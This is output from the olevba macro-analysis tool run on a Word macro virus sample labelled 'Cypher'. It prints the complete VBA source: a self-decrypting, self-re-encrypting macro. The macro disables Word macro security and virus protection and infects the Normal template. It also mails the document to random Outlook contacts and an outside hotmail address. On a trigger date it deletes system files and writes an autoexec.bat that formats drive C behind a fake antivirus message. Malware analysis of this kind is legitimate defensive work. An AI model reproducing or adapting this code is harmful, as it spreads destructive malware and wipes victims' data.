olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cypher-0f98149297edc0fb3b0c08acfb38eab602b37713
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: Virus.MSWord.Cypher-0f98149297edc0fb3b0c08acfb38eab602b37713 - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    Dim M(2) As Variant: Dim L(8) As Byte
    Set M(1) = ActiveDocument.VBProject.VBComponents.Item(1)
    Set M(2) = NormalTemplate.VBProject.VBComponents.Item(1)
    Set CM = M(1).CodeModule
    LinBeg = 33
    Line1 = CM.Lines(LinBeg, 1)
    L(1) = 1: n = 1 + LinBeg: CC = CM.Lines(LinBeg, CM.CountOfLines - LinBeg)
    For I = 2 To 8
        L(I) = Mid(Line1, I, 1)
    Next
    Do While InStr(CM.Lines(n, 1), ": End" + " Sub") = False
        CypLinen = CM.Lines(n, 1)
        Linen = ""
        For k = 2 To Len(CypLinen)
            o = Asc(Mid(CypLinen, k, 1))
            j = Int(o / 32) + 1
            I = 1
            Do While (j <> L(I))
                I = I + 1
            Loop
            nc = o - 32 * (L(I) - I)
            Linen = Linen + Chr(nc)
        Next
        CM.ReplaceLine n, Linen: n = n + 1
    Loop
    CM.DeleteLines LinBeg
    BDMFS (M)
    CM.DeleteLines LinBeg, CM.CountOfLines - LinBeg: CM.InsertLines LinBeg, CC:    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub BDMFS(M As Variant)
'7832546
'ÀÀÀÀïNÀåRRORÀòESUMEÀîEXT
'ÀÀÀÀéFÀóYSTEMÎðRIVATEðROFILEóTRINGÈÂÂÌÀÂèëåùÿãõòòåîôÿõóåòüóOFTWAREüíICROSOFTüïFFICEüÙÎÐü÷ORDüóECURITYÂÌÀÂìEVELÂÉÀÜÞÀÂÂÀôHENÀóYSTEMÎðRIVATEðROFILEóTRINGÈÂÂÌÀÂèëåùÿãõòòåîôÿõóåòüóOFTWAREüíICROSOFTüïFFICEüÙÎÐü÷ORDüóECURITYÂÌÀÂìEVELÂÉÀÝÀÑ
'ÀÀÀÀãOMMANDâARSÈÂôOOLSÂÉÎãONTROLSÈÂíACROÂÉÎåNABLEDÀÝÀæALSEÚÀïPTIONSÎãONFIRMãONVERSIONSÀÝÀæALSEÚÀïPTIONSÎöIRUSðROTECTIONÀÝÀæALSEÚÀïPTIONSÎóAVEîORMALðROMPTÀÝÀæALSE
'ÀÀÀÀóETÀFSÀÝÀãREATEïBJECTÈÂóCRIPTINGÎæILEóYSTEMïBJECTÂÉ
'ÀÀÀÀóETÀæÀÝÀFSÎçETæILEÈîORMALôEMPLATEÎæULLîAMEÉÚÀæÎáTTRIBUTESÀÝÀÐ
'éFÀäATEÀÞÀÃ×ÏÑ×ÏÒÐÐÐÃÀôHENÀÇITÀSÀMYÀBIRTHDAYÀÁ
'ÀÀÀÀéFÀáPPLICATIONÎõSERîAMEÀÜÞÀÂ^^^áNGELÂÀôHEN
'ÀÀÀÀÀÀÀÀFSÎäELETEæILEÀÂãÚüIOÎSYSÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚüCONFIGÎSYSÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚüáUTOEXECÎBATÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚü÷INDOWSüWINÎCOMÂÌÀôRUEÚ
'ÀÀÀÀÀÀÀÀéFÀéNóTRÈáPPLICATIONÎõSERîAMEÌÀÂKHÂÉÀÝÀôRUEÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀóETÀAUÀÝÀFSÎãREATEôEXTæILEÈÂãÚüAUTOEXECÎBATÂÌÀôRUEÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀOFFÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀùOURÀãOMPUTERÀISÀBEINGÀCHECKEDÀBYÀYOURÀáNTIöIRUSÀÍÀðLEASEÀ÷AITÀÍÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀ^^^áNGELÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂFORMATÀCÚÀÏAUTOTESTÀÏQÀÏUÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎãLOSE
'ÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀåNDÀéF
'ÀÀÀÀéFÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÎîAMEÀÝÀÂôHISäOCÂÀôHEN
'ÀÀÀÀÀÀÀÀóETÀïìÀÝÀãREATEïBJECTÈÂïUTLOOKÎáPPLICATIONÂÉ
'ÀÀÀÀÀÀÀÀóETÀíîÀÝÀïìÎçETîAMEóPACEÈÂíáðéÂÉÚÀíîÎìOGONÚÀóETÀïíÀÝÀïìÎãREATEéTEMÈOLíAILéTEMÉ
'ÀÀÀÀÀÀÀÀæORÀAÀÝÀÑÀôOÀíîÎáDDRESSìISTSÎãOUNT
'ÀÀÀÀÀÀÀÀÀÀÀÀòANDOMIZEÀôIMER
'ÀÀÀÀÀÀÀÀÀÀÀÀéFÀíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÞÀØÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀæORÀRÀÝÀÑÀôOÀéNTÈíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÏÀØÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀôARGETÀÝÀéNTÈÑÀËÀíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÊÀòNDÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀïíÎòECIPIENTSÎáDDÀÈíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÈôARGETÉÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀîEXT
'ÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀîEXT
'ÀÀÀÀÀÀÀÀ÷ITHÀïí
'ÀÀÀÀÀÀÀÀÀÀÀÀóETÀòECÀÝÀÎòECIPIENTSÎáDDÈÂOUTLOOKÙ×ÿÒÐÐÐàHOTMAILÎCOMÞÂÉÚÀòECÎòESOLVE
'ÀÀÀÀÀÀÀÀÀÀÀÀÎóUBJECTÀÝÀáCTIVEäOCUMENTÎîAMEÚÀÎâODYÀÝÀáPPLICATIONÎõSERîAMEÀÆÀVBãRìFÀÆÀáPPLICATIONÎõSERáDDRESSÀÆÀVBãRìFÀÆÀVBãRìFÚÀÎáTTACHMENTSÎáDDÀáCTIVEäOCUMENTÎæULLîAMEÚÀÎóEND
'ÀÀÀÀÀÀÀÀåNDÀ÷ITH
'ÀÀÀÀÀÀÀÀíîÎìOGOFF
'ÀÀÀÀÀÀÀÀóETÀïìÀÝÀîOTHING
'ÀÀÀÀåNDÀéF
'åNDÀéF
'ÀÀÀÀîBìÑÀÝÀíÈÑÉÎãODEíODULEÎãOUNTïFìINES
'ÀÀÀÀîBìÒÀÝÀíÈÒÉÎãODEíODULEÎãOUNTïFìINES
'ÀÀÀÀéîæÿÀÝÀæALSEÚÀìINâEGÀÝÀÓÓ
'ÀÀÀÀéFÀíÈÒÉÎîAMEÀÜÞÀÂôHISäOCÂÀôHEN
'ÀÀÀÀÀÀÀÀéFÀîBìÒÀÞÀÐÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎäELETEìINESÀÑÌÀîBìÒ
'ÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀíÈÒÉÎîAMEÀÝÀÂôHISäOCÂÚÀéîæÀÝÀôRUE
'ÀÀÀÀåNDÀéF
'ÀÀÀÀéFÀéîæÀÝÀæALSEÀôHENÀçOôOÀãòùðôÿ
'ÀÀÀÀîEWîAMEÀÝÀÂÂ
'ÀÀÀÀòANDOMIZEÀôIMER
'ÀÀÀÀæORÀéÀÝÀÑÀôOÀÕ
'ÀÀÀÀÀÀÀÀîEWîAMEÀÝÀîEWîAMEÀËÀãHRÈéNTÈÖÕÀËÀÈÒÕÀÊÀòNDÉÉÉ
'ÀÀÀÀîEXT
'ÀÀÀÀéFÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈÑÌÀÑÉÌÀÂïPENÂÉÀôHEN
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎáDDæROMóTRINGÀÂðRIVATEÀóUBÀäOCUMENTÿãLOSEÈÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÒÌÀÂÀÀÀÀïNÀåRRORÀòESUMEÀîEXTÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÓÌÀÂÀÀÀÀäIMÀíÈÒÉÀáSÀöARIANTÚÀäIMÀìÈØÉÀáSÀâYTEÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÔÌÀÂÀÀÀÀóETÀíÈÒÉÀÝÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÕÌÀÂÀÀÀÀóETÀíÈÑÉÀÝÀîORMALôEMPLATEÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀìINEÀÝÀÖ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÌÀÂäELETEÂÉÀÝÀæALSE
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀãíÎäELETEìINESÀìINâEGÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀîEWîAMEÀËÀÂÈíÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀÂãíÎäELETEìINESÀìINâEGÌÀãíÎãOUNTïFìINESÀÍÀìINâEGÚÀãíÎéNSERTìINESÀìINâEGÌÀããÚÀÀÀÀáCTIVEäOCUMENTÎóAVEáSÀæILEîAMEÚÝáCTIVEäOCUMENTÎæULLîAMEÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂåNDÀóUBÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂóUBÀÂÀËÀîEWîAMEÀËÀÂÈíÀáSÀöARIANTÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÀÜÞÀÂÂ
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀåLSEéFÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈÑÌÀÑÉÌÀÂãLOSEÂÉÀôHEN
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎáDDæROMóTRINGÀÂðRIVATEÀóUBÀäOCUMENTÿïPENÈÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÒÌÀÂÀÀÀÀïNÀåRRORÀòESUMEÀîEXTÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÓÌÀÂÀÀÀÀäIMÀíÈÒÉÀáSÀöARIANTÚÀäIMÀìÈØÉÀáSÀâYTEÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÔÌÀÂÀÀÀÀóETÀíÈÑÉÀÝÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÕÌÀÂÀÀÀÀóETÀíÈÒÉÀÝÀîORMALôEMPLATEÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀìINEÀÝÀÖ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÌÀÂäELETEÂÉÀÝÀæALSE
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀãíÎäELETEìINESÀìINâEGÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀîEWîAMEÀËÀÂÈíÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀÂãíÎäELETEìINESÀìINâEGÌÀãíÎãOUNTïFìINESÀÍÀìINâEGÚÀãíÎéNSERTìINESÀìINâEGÌÀããÚÀÀÀÀáCTIVEäOCUMENTÎóAVEáSÀæILEîAMEÚÝáCTIVEäOCUMENTÎæULLîAMEÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂåNDÀóUBÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂóUBÀÂÀËÀîEWîAMEÀËÀÂÈíÀáSÀöARIANTÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÀÜÞÀÂÂ
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀåNDÀéF
'ãòùðôÿÚ
'ÀÀÀÀäIMÀìÈØÉÀáSÀâYTE
'ÀÀÀÀéFÀéîæÀÝÀæALSEÀôHENÀçOôOÀåîäÿ
'ÀÀÀÀòANDOMIZEÀôIMER
'ÀÀÀÀìÈÑÉÀÝÀÑ
'ÀÀÀÀæORÀéÀÝÀÒÀôOÀØ
'ÀÀÀÀÀÀÀÀæOUNDÀÝÀæALSE
'ÀÀÀÀÀÀÀÀéTERÀÝÀÐ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀæOUNDÀÝÀæALSE
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéTERÀÝÀéTERÀËÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀNÀÝÀéNTÈÈØÀÊÀòNDÉÀËÀÑÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéFÀNÀÜÞÀéÀïRÀéTERÀÞÀÑÕÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀJÀÝÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀäOÀ÷HILEÀÈìÈJÉÀÜÞÀNÉÀáNDÀJÀÜÀé
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀJÀÝÀJÀËÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéFÀJÀÝÀéÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀæOUNDÀÝÀôRUE
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀìÈéÉÀÝÀN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀîEXT
'ÀÀÀÀJÀÝÀìINâEG
'ÀÀÀÀäIMÀãYPHERÀáSÀóTRINGÚÀãYPHERÀÝÀÂÂ
'ÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÒÉÎãODEíODULEÎìINESÈJÌÀÑÉÌÀÂÚÀåNDÀÂÀËÀÂóUBÂÉÀÝÀæALSE
'ÀÀÀÀÀÀÀÀìINEJÀÝÀíÈÒÉÎãODEíODULEÎìINESÈJÌÀÑÉ
'ÀÀÀÀÀÀÀÀãYPìINEJÀÝÀÂÇÂ
'ÀÀÀÀÀÀÀÀæORÀKÀÝÀÑÀôOÀìENÈìINEJÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀOÀÝÀáSCÈíIDÈìINEJÌÀKÌÀÑÉÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀéÀÝÀéNTÈOÀÏÀÓÒÉÀËÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀãÀÝÀÓÒÀÊÀÈìÈéÉÀÍÀéÉÀËÀO
'ÀÀÀÀÀÀÀÀÀÀÀÀãYPìINEJÀÝÀãYPìINEJÀËÀãHRÈãÉ
'ÀÀÀÀÀÀÀÀîEXT
'ÀÀÀÀÀÀÀÀãYPHERÀÝÀãYPHERÀËÀãYPìINEJÀËÀãHRÈÑÓÉ
'ÀÀÀÀÀÀÀÀJÀÝÀJÀËÀÑ
'ÀÀÀÀìOOP
'ÀÀÀÀëEÀÝÀÂÂ
'ÀÀÀÀæORÀéÀÝÀÒÀôOÀØ
'ÀÀÀÀÀÀÀÀëEÀÝÀëEÀËÀæORMATÈìÈéÉÉ
'ÀÀÀÀîEXT
'ÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINâEGÌÀÂÇÂÀËÀëE
'ÀÀÀÀíÈÒÉÎãODEíODULEÎäELETEìINESÀìINâEGÀËÀÑÌÀíÈÒÉÎãODEíODULEÎãOUNTïFìINESÀÍÀìINâEG
'ÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINâEGÀËÀÑÌÀãYPHERÀËÀÂÚÀåNDÂÀËÀÂÀóUBÂ
'åîäÿÚ
: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

